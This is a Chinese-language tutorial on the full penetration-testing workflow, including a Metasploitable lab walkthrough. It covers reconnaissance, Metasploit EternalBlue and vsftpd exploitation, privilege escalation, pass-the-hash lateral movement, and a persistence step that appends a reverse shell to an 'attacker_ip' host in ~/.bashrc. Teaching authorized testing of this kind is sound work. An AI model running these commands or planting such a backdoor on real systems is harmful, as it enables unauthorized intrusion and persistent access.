# 渗透测试完整流程：从信息收集到后渗透

渗透测试是评估系统安全性的专业方法。通过模拟攻击者的行为，发现系统中的安全漏洞。

本文将介绍渗透测试的完整流程，包括信息收集、漏洞扫描、漏洞利用和后渗透等阶段。

## 信息收集：渗透测试的第一步

信息收集是渗透测试的基础，收集到的信息越多，后续的攻击面就越清晰。

**主动信息收集**

直接与目标交互获取信息：

```bash
# 端口扫描
nmap -sV -sC target_ip

# 服务识别
nmap -sV -p 1-65535 target_ip

# 操作系统探测
nmap -O target_ip
```

**被动信息收集**

不直接与目标交互：

```bash
# 域名信息
whois example.com

# DNS记录
dig example.com

# 子域名枚举
subfinder -d example.com
```

**信息整理**

收集到的信息需要整理分析：
- 开放的服务和端口
- 使用的软件和版本
- 可能的攻击面
- 潜在的漏洞

**常用工具**

- Nmap：端口扫描
- theHarvester：邮箱和子域名收集
- Recon-ng：信息收集框架
- Maltego：可视化信息分析

## 漏洞扫描与利用

信息收集完成后，需要发现和利用目标系统中的漏洞。

**漏洞扫描**

```bash
# Nmap脚本扫描
nmap --script vuln target_ip

# Nikto Web扫描
nikto -h http://target_ip

# OpenVAS漏洞扫描
```

**Metasploit框架**

Metasploit是最流行的渗透测试框架：

```bash
# 启动Metasploit
msfconsole

# 搜索漏洞模块
search type:exploit platform:windows

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 配置参数
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 执行攻击
exploit
```

**常见漏洞类型**

1. Web应用漏洞：SQL注入、文件上传、命令执行
2. 服务漏洞：SSH弱口令、FTP匿名访问
3. 配置缺陷：默认密码、不必要的服务
4. 已知漏洞：CVE编号对应的漏洞

**漏洞利用的注意事项**

- 获得授权才能进行测试
- 记录所有操作
- 不要造成不必要的破坏

## 后渗透：扩大战果

拿到shell只是开始，后渗透阶段要做的事情更多。

**权限提升**

从普通用户提升到root权限：

```bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 检查内核版本
uname -a

# 检查sudo权限
sudo -l

# 利用内核漏洞
searchsploit linux kernel 4.4
```

**横向移动**

在内网中扩大战果：

```bash
# 密码喷洒
crunch 8 8 -t ,,,,1234 -o wordlist.txt

# Pass the Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
```

**持久化**

保持对目标的访问：

```bash
# 添加计划任务
crontab -e

# 修改启动脚本
echo "/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> ~/.bashrc
```

**信息收集**

在内网中继续收集信息：

```bash
# 网络扫描
arp -a

# 用户枚举
net user

# 域信息
nltest /dclist:domain.local
```

## Metasploitable靶机实战

Metasploitable是专门设计的有漏洞的Linux系统，适合练习渗透测试。

**环境搭建**

1. 下载Metasploitable镜像
2. 导入虚拟机
3. 配置网络（仅主机模式）
4. 启动虚拟机

**攻击流程**

```bash
# 1. 信息收集
nmap -sV 192.168.56.101

# 2. 发现服务
# vsftpd 2.3.4 - 后门漏洞
# Apache struts - 远程代码执行
# Tomcat - 默认凭证

# 3. 利用漏洞
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
exploit

# 4. 后渗透
shell
id
cat /etc/passwd
```

**靶机上的漏洞**

- vsFTPD后门
- SSH弱口令
- Apache Tomcat默认凭证
- Samba用户枚举
- UML漏洞

**练习建议**

1. 从简单的漏洞开始
2. 记录每个步骤
3. 理解漏洞原理
4. 尝试不同的利用方法

## 渗透测试工具箱

渗透测试需要各种工具的配合。

**扫描工具**

- Nmap：端口扫描和服务识别
- Nessus：漏洞扫描
- OpenVAS：开源漏洞扫描

**利用工具**

- Metasploit：渗透测试框架
- Cobalt Strike：商业渗透测试工具
- SQLMap：SQL注入自动化

**密码破解**

- John the Ripper：密码破解
- Hashcat：GPU加速密码破解
- Hydra：在线密码破解

**无线安全**

- Aircrack-ng：无线网络审计
- Wifite：自动化无线攻击

**Web安全**

- Burp Suite：Web应用测试
- OWASP ZAP：开源Web安全扫描
- Nikto：Web服务器扫描

**后渗透**

- Mimikatz：Windows凭证提取
- Empire：后渗透框架
- Covenant：.NET后渗透框架

**报告工具**

- Dradis：渗透测试报告
- Pwndoc：漏洞报告

工具只是辅助，理解漏洞原理才是核心。
